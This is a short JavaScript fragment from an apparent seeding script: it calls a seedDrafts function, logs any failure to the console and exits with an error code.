seedDrafts().catch((err) => {
  console.error("Failed to seed drafts:", err);
  process.exit(1);
});
